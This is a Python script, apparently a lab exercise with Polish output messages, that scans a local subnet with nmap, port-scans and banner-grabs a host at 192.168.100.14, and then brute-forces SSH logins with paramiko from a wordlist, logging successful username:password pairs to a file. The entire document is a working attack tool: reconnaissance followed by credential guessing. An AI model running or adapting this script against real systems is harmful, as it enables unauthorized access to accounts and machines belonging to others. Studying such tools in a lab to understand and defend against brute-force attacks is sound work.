import os
import socket
import threading
import paramiko

mine1 = os.popen('ifconfig eth0 | grep "inet " | cut -c 14-27')
myip = mine1.read()
mine2 = os.popen('ifconfig eth0 | grep "inet " | cut -c 38-51')
mymask = mine2.read()
ip = os.popen('nmap -sP 192.168.100.0/24 | grep "Nmap scan" | cut -c 22-38')
adresyip = ip.read()

print(f"Adres IP: {myip}")
print(f"Maska podsieci: {mymask}")
print(f"Adresy IP w sieci:\n{adresyip}")


def scan_port(port):

    host = "192.168.100.14"
    host_ip = socket.gethostbyname(host)

    status = False

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host_ip, port))
        status = True
    except:
        status = False

    if status:
        print("port {} is open".format(port))


for i in range(0, 100):
    thread = threading.Thread(target=scan_port, args=[i])
    thread.start()

def grab_banner(ip_address, port):
    try:
        s = socket.socket()
        s.connect((ip_address, port))
        banner = s.recv(1024)
        s.close()
        return banner
    except:
        return ''


def main():
    ports = [21, 22,]
    for port in ports:
        ip_address = '192.168.100.14'
        print (grab_banner(ip_address, port))


if __name__ == '__main__':
    main()

def banner_grab_http(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
        request = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"
        s.send(request)
        response = s.recv(1024)
        server_version = response.decode().split("Server: ")[1].split("\r\n")[0]
        return server_version
    except:
        return None

server_version = banner_grab_http("192.168.100.14", 80)

if server_version:
    print("Wersja serwera HTTP:", server_version)
else:
    print("Nie udało się pobrać wersji serwera HTTP.")

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


with open('dane.txt', 'r', encoding='utf-8') as file:
    users = file.read().splitlines()
with open('dane.txt', 'r', encoding='utf-8') as file:
    passwords = file.read().splitlines()
log = open('hasla.txt', 'wt')
for user in users:
    for passwd in passwords:
        try:

            ssh.connect("192.168.100.14", port=22, username=user, password=passwd, timeout=15)
            print(f"Login successful (login:password)-> {user}:{passwd}", file=log)

        except:
            print('Szukanie danych')
            pass
log.close()

log = open('hasla.txt', 'rt')
caly_tekst = log.read()
log.close()
print(caly_tekst)